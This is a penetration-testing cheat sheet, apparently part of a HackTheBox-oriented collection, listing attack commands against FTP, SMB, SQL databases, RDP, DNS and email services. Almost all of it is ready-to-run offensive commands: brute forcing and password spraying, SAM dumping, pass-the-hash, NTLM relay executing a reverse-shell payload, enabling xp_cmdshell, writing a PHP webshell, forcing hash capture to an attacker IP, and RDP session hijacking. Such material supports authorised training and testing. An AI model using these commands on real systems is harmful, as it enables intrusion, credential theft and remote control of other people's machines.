# Attacking Common Services

## FTP

| Command | Description |
|---|---|
| `ftp <TARGET>` | Connect with the FTP client |
| `nc -v <TARGET> 21` | Manual banner grab/connect |
| `hydra -l <USER> -P rockyou.txt ftp://<TARGET>` | Brute force |

## SMB

| Command | Description |
|---|---|
| `smbclient -N -L //<TARGET>` | Null-session share listing |
| `smbmap -H <TARGET>` | Share enumeration |
| `smbmap -H <TARGET> -r <SHARE>` | Recursive listing |
| `smbmap -H <TARGET> --download "<SHARE>\file.txt"` | Download a file |
| `smbmap -H <TARGET> --upload local.txt "<SHARE>\test.txt"` | Upload a file |
| `rpcclient -U'%' <TARGET>` | Null-session rpcclient |
| `./enum4linux-ng.py <TARGET> -A -C` | Automated SMB enumeration |
| `crackmapexec smb <TARGET> -u users.txt -p '<PASS>'` | Password spray across a user list |
| `impacket-psexec <USER>:'<PASS>'@<TARGET>` | Shell via SMB/psexec |
| `crackmapexec smb <TARGET> -u <USER> -p '<PASS>' -x 'whoami' --exec-method smbexec` | One-off command execution |
| `crackmapexec smb <CIDR> -u <USER> -p '<PASS>' --loggedon-users` | Find logged-on users network-wide |
| `crackmapexec smb <TARGET> -u <USER> -p '<PASS>' --sam` | Dump SAM |
| `crackmapexec smb <TARGET> -u Administrator -H <NTHASH>` | Pass-the-Hash |
| `impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET>` | Relay captured auth to dump SAM |
| `impacket-ntlmrelayx ... -c 'powershell -e <b64_reverse_shell>'` | Relay to execute a payload |

## SQL Databases

**Connecting:**
```bash
mysql -u <USER> -p<PASS> -h <TARGET>
sqlcmd -S <SERVER>\SQLEXPRESS -U <USER> -P '<PASS>' -y 30 -Y 30
sqsh -S <TARGET> -U <USER> -P '<PASS>' -h          # Linux MSSQL client
sqsh -S <TARGET> -U .\\<USER> -P '<PASS>' -h        # when MSSQL uses Windows Auth
```

**MySQL enumeration:**
```sql
SHOW DATABASES;
USE htbusers;
SHOW TABLES;
SELECT * FROM users;
```

**MSSQL enumeration:**
```sql
SELECT name FROM master.dbo.sysdatabases
USE htbusers
SELECT * FROM htbusers.INFORMATION_SCHEMA.TABLES
SELECT * FROM users
```

**MSSQL → OS command execution:**
```sql
EXECUTE sp_configure 'show advanced options', 1
EXECUTE sp_configure 'xp_cmdshell', 1
RECONFIGURE
xp_cmdshell 'whoami'
```

**File read/write:**
```sql
-- MySQL: write a webshell
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php'
SHOW VARIABLES LIKE "secure_file_priv";   -- must be empty to read local files
SELECT LOAD_FILE("/etc/passwd");

-- MSSQL: read a local file
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
```

**MSSQL hash theft / linked servers:**
```sql
EXEC master..xp_dirtree '\\<ATTACKER_IP>\share\'      -- captures NetNTLM hash
EXEC master..xp_subdirs '\\<ATTACKER_IP>\share\'
SELECT srvname, isremote FROM sysservers                -- find linked servers
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [LINKED_SERVER]
```

## RDP

| Command | Description |
|---|---|
| `crowbar -b rdp -s <TARGET>/32 -U users.txt -c '<PASS>'` | Password spray |
| `hydra -L users.txt -p '<PASS>' <TARGET> rdp` | Brute force |
| `rdesktop -u <USER> -p <PASS> <TARGET>` | Connect from Linux |
| `xfreerdp /v:<TARGET> /u:<USER> /pth:<NTHASH>` | Pass-the-Hash RDP login |

**RDP session hijacking (SYSTEM required):**
```
tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
net start sessionhijack
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

## DNS

| Command | Description |
|---|---|
| `dig AXFR @<NS> <DOMAIN>` | Zone transfer attempt |
| `subfinder -d <DOMAIN> -v` | Subdomain brute force |
| `host <SUBDOMAIN>` | Basic lookup |

## Email Services

| Command | Description |
|---|---|
| `host -t MX <DOMAIN>` / `dig mx <DOMAIN> \| grep "MX" \| grep -v ";"` | Find mail servers |
| `telnet <TARGET> 25` | Manual SMTP interaction |
| `smtp-user-enum -M RCPT -U users.txt -D <DOMAIN> -t <TARGET>` | SMTP user enumeration |
| `python3 o365spray.py --validate --domain <DOMAIN>` | Check O365 usage |
| `python3 o365spray.py --enum -U users.txt --domain <DOMAIN>` | Enumerate O365 users |
| `python3 o365spray.py --spray -U found.txt -p '<PASS>' --count 1 --lockout 1 --domain <DOMAIN>` | O365 password spray |
| `hydra -L users.txt -p '<PASS>' -f <TARGET> pop3` | POP3 brute force |
| `swaks --from a@x.com --to b@x.com --header 'Subject: test' --body 'msg' --server <TARGET>` | Test for open mail relay |

---

<div align="center">

*Part of the [D4RKGUNN3R Cheatsheets](./README.md) collection. Applied example — SMTP relay used for phishing delivery: [Job](https://github.com/Dylans7j/HackTheBox-Walkthroughs/blob/main/job.md)*

</div>
